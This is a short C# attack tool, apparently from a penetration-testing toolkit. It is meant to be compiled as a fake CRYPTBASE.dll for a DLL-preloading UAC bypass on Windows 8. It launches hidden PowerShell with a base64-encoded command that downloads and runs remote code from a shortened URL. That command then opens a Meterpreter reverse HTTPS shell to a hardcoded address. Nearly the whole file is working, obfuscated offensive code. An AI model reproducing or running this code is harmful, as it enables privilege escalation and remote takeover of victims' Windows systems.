//Dirty way to run invoke shellcode powershell
//Author: Chris Campbell 
//Used to execute dll preloading attack for UACbypass
//csc.exe /t:library /out:CRYPTBASE.dll c:\demo\ExecPowerShell.cs
//Windows8: drop in c:\windows\ehome\ with com file io and execute c:\windows\ehome\Mcx2Prov.exe 

using System;

class PowerSploit
{
    static void Main(string[] args) 
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
  	System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
	startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
	startInfo.FileName = "powershell.exe";
	startInfo.Arguments = "-nop -nol -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwAxADQAYgBaAFoAMABjACcAKQA7ACAASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAgAC0AUABhAHkAbABvAGEAZAAgAHcAaQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAxADkAMgAuADEANgA4AC4AMQAuADEANQAgAC0ATABwAG8AcgB0ACAANAA0ADMAIAAtAEYAbwByAGMAZQA=";
	process.StartInfo = startInfo;
	process.Start();
    }
}
